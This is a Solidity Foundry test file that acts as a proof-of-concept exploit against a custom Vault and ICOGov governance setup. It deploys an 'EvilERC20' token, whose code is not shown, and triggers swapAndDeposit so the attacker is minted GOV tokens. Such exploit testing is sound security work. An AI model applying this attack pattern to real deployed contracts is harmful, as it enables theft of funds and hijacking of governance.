// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/GOVToken.sol";
import "../src/BaseToken.sol";
import "../src/ICOGov.sol";
import "../src/EvilERC20.sol";
import "../mock/MockRouter.sol";

contract ExploitTest is Test {
    Vault vault;
    BaseToken baseToken;
    GOVToken govToken;
    ICOGov icoGov;
    EvilERC20 evil;
    MockRouter router;

    address attacker = address(1337);

    function setUp() public {
        vm.startPrank(attacker);

        // Deploy base token
        baseToken = new BaseToken();
        baseToken.mint(attacker, 1_000_000 ether);

        // Deploy mock router
        router = new MockRouter(ERC20(address(baseToken)));

        // Give router enough baseToken to simulate swap
        baseToken.mint(address(router), 1_000_000 ether);

        // Deploy vault
        vault = new Vault(ERC20(address(baseToken)), IRouter(address(router)));

        // Deploy governance token
        govToken = new GOVToken(attacker);
        govToken.transferOwnership(attacker); // Temporarily transfer for setup

        // Deploy ICOGov
        icoGov = new ICOGov(govToken, vault, address(0xdead), 1 ether);

        // Set ICOGov as the owner of govToken
        vm.stopPrank();
        vm.prank(attacker);
        govToken.transferOwnership(address(icoGov));

        // Deploy evil token with payload
        vm.startPrank(attacker);
        evil = new EvilERC20(vault, icoGov, govToken);

        // Mint initial VT to attacker so buyToken can work
        baseToken.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether);

        // Approve EvilERC20 to move VT on attacker's behalf
        vault.approve(address(evil), 1000 ether);

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Approve vault to take evil tokens
        evil.approve(address(vault), 1000 ether);

        // Trigger exploit via swapAndDeposit
        vault.swapAndDeposit(1000 ether, evil, 1 ether);

        uint govReceived = govToken.balanceOf(attacker);
        emit log_named_uint("Attacker GOV minted", govReceived);

        assertGt(govReceived, 1000, "Attacker profited via GOV mint");

        vm.stopPrank();
    }
}
